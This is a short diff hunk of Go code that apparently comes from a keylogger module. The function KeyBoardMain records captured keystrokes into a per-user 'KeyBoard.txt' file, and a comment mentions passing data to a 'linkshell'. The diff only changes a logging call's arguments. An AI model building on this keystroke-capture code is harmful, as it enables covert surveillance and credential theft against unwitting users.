@@ -35,7 +35,7 @@ func KeyBoardMain(OutKey chan *ctype.KeyBoardData, done chan bool) {
 		outfile := fmt.Sprintf("[%v|0x%X]", string(char), key)
 		err = utils.WriteCacheByUid(u2, []string{outfile}, "KeyBoard.txt", true, true)
 		if err != nil {
-			utils.LogPf("[-]Error of WriteCacheByUid: %v\n", err)
+			utils.LogPf(0, "[-]Error of WriteCacheByUid: %v\n", err)
 		}
 		// 生成uuid 并且放入linkshell
 
